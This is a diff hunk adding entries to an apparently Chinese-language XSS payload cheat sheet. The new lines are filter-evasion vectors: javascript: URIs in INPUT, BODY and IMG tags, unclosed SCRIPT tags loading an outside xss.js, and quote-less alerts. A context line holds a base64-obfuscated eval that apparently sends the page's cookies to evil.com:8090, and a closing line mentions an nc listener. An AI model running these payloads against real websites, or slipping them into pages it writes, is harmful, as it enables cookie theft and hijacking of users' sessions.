@@ -68,6 +68,28 @@ eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbTo4MDkwL3IucGhwP2M9Iitkb
 <d3"<"/onclick="1>[confirm``]"<">z
 绕过（）：setTimeout`alert\x28document.domain\x29`
 "-prompt`1` - "//
+Input Image
+<INPUT SRC=”javascript:alert(‘XSS’);”>
+BODY Image
+<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
+BODY标签
+<BODY(‘XSS’)>
+IMG Dynsrc
+<IMG DYNSRC=”javascript:alert(‘XSS’)”>
+换码过滤的JavaScript
+\";alert('XSS');//
+无结束脚本标记(仅火狐等浏览器)
+<SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>
+Spaces和meta前的IMG标签
+<IMG SRC=” javascript:alert(‘XSS’);”>
+半开的HTML/JavaScript XSS
+<IMG SRC=”javascript:alert(‘XSS’)”
+双开角括号
+<iframe src=http://3w.org/XSS.html <
+无单引号、双引号、分号
+<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>
+<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
 ```
 
 nc 监听：
